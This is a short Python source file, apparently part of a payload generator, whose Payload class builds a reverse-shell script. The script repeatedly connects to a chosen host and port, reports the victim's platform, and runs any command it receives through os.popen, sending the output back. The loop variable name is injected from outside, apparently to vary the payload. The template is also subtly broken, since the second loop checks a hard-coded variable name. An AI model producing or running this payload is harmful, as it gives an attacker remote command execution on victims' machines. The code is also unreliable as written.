class Payload:
    def __init__(self, host: str, port: int, strs: list):
        self.host, self.port, self.strs = host, port, strs

    def create(self):
        return """
{connected} = False
while not {connected}:\n\ttry:\n\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
\t\tconn.connect(('{host}', int({port})))
\t\t{connected} = True
\texcept:\n\t\t{connected} = False\n\telse:\n\t\tconn.send((sys.platform).encode("UTF-8"))
while connected:\n\t\ttry:
\t\t\tconn.send(os.popen(conn.recv(1024).decode("UTF-8")).read().encode("UTF-8"))\n\t\texcept:\n\t\t\t{connected} = False
""".format(port=str(self.port), host=self.host, connected=self.strs[0])
